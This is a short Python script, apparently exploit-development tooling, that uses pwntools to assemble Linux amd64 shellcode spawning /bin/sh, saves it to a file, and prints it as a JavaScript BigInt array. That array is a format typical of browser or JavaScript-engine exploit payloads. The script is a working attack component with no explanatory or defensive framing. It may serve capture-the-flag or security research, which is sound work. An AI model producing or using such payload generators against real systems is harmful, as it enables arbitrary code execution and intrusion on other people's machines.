# generate_shellcode.py
from pwn import context, shellcraft, asm

context.clear(arch="amd64", os="linux")

sc = asm(
    shellcraft.execve("/bin/sh", 0, 0)
)

with open("shellcode.bin", "wb") as f:
    f.write(sc)

def to_js_bigints(b: bytes) -> str:
    lines = []
    for i in range(0, len(b), 8):
        chunk = b[i:i+8]
        lines.append(f"\t0x{chunk[::-1].hex()}n,")  # little-endian per 8 bytes
    return "var shellcode = [\n" + "\n".join(lines) + "\n];"

print(to_js_bigints(sc))
